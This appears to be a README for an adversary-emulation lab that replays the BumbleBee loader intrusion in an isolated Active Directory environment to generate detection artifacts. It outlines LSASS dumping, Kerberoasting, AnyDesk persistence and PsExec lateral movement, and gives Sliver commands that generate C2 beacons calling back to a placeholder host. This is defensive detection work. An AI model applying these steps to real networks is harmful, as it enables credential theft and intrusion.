# Attack Simulation

Fully automated replication of the 11-day BumbleBee loader intrusion from DFIR Report Aug 2022.
Real malware is replaced with legitimate red team tools that produce identical Windows event artifacts.

> **Lab use only.** These scripts require a purpose-built isolated Active Directory lab to function.
> They are hardcoded to specific lab hostnames and IP ranges and cannot be used against external targets.

## Structure

```
attack-simulation/
├── run_attack.py            - Main orchestrator (coordinates Ansible + Sliver + HTTP server)
├── setup_payloads.sh        - One-time Kali setup (installs tools, generates Sliver implants)
└── ansible/
    ├── inventory.yml        - Lab host inventory (update IPs to match your lab)
    ├── lab_prep.yml         - One-time AD setup (accounts, audit policies, SPN registration)
    ├── attack_day1.yml      - Initial access, C2, discovery, AnyDesk persistence, AdFind
    ├── attack_day2.yml      - VulnRecon on YAMCHA-PC
    ├── attack_day4.yml      - VulnRecon + Procdump LSASS + AdFind second run
    ├── attack_day7.yml      - AnyDesk re-access + VulnRecon + Seatbelt
    └── attack_day11.yml     - Kerberoast + LSASS + AdFind + PsExec to DC
```

Payload files (binaries and PS1 scripts) live outside this repo - see setup instructions below.

## Setup (run once)

**1. Set credentials as environment variables - never hardcode them:**

```bash
export DA_PASS="<domain-admin-password>"
export SVC_PASS="<svc_backup-password>"
```

**2. Run the setup script on Kali to install tools and generate Sliver implants:**

```bash
chmod +x setup_payloads.sh
./setup_payloads.sh
```

This installs: impacket, colorama, Sliver C2, Procdump, AnyDesk, PowerSploit.
It also generates `wab.exe` (Sliver beacon) and `namr.dll` (Sliver DLL loader).

**3. Prepare the lab AD environment:**

```bash
ansible-playbook -i ansible/inventory.yml ansible/lab_prep.yml
```

This creates the `svc_backup` kerberoastable service account, registers its SPN, enables audit policies, and configures PowerShell Script Block Logging on all hosts.

**4. Run a preflight check:**

```bash
python3 run_attack.py --check
```

## Running the Simulation

```bash
# Full 11-day kill chain (fast mode - no delays between days)
python3 run_attack.py --fast

# Single day - useful for testing specific detection rules
python3 run_attack.py --day 1 --fast
python3 run_attack.py --day 11 --fast

# List all phases
python3 run_attack.py --list
```

## What Each Day Produces

| Day | Phase | Key Windows Events |
|-----|-------|--------------------|
| Day 1 | Initial Access + C2 | Sysmon E1 (IternalJob), E3 (C2 beacon), E8 (process injection), Event 7045 (AnyDesk) |
| Day 2 | Reconnaissance | Sysmon E1 (VulnRecon.ps1 with flags) |
| Day 4 | Credential Access | Sysmon E10 (LSASS dump), E11 (procdump drop), E23 (tool deletion) |
| Day 7 | Persistence Check | Sysmon E1 (Seatbelt), AnyDesk TLS in Zeek |
| Day 11 | Final Objectives | PS E4104 (Kerberoast + LSASS), Event 4769 RC4, Event 7045 on DC |

## Substitutions vs Real Malware

| Real Component | Lab Substitute | Artifacts Produced |
|---------------|---------------|-------------------|
| BumbleBee DLL loader | namr.dll with IternalJob export | Sysmon E1 - rundll32 + IternalJob |
| Cobalt Strike C2 | Sliver C2 mTLS on port 443 | Sysmon E3 - outbound beacon |
| Real comsvcs dump | comsvcs.dll MiniDump (native Windows) | PS E4104 - script block |
| Invoke-Kerberoast | kerberoast.ps1 (native PS) | PS E4104 - decoded Kerberoast |
| Real AdFind | adfind_sub.ps1 (native AD cmdlets) | PS E4104 - Get-ADUser/Computer |
| Real PsExec | impacket-psexec | Event 7045 (random service) + Event 4624 |

## Files NOT Included in This Repo

The following are excluded because they are binaries or third-party tools:

- `payloads/tools/wab.exe` - generate with Sliver: `generate --mtls <kali_ip>:443 --os windows --format exe`
- `payloads/tools/namr.dll` - generate with Sliver: `generate --mtls <kali_ip>:443 --os windows --format shared`
- `payloads/tools/procdump64.exe` - download from Sysinternals
- `payloads/tools/AnyDesk.exe` - download from anydesk.com
- `payloads/ps1/PowerView.ps1` - clone from PowerShellMafia/PowerSploit
- `bumblebee_full_attack.pcap` - full PCAP from lab run (too large for GitHub)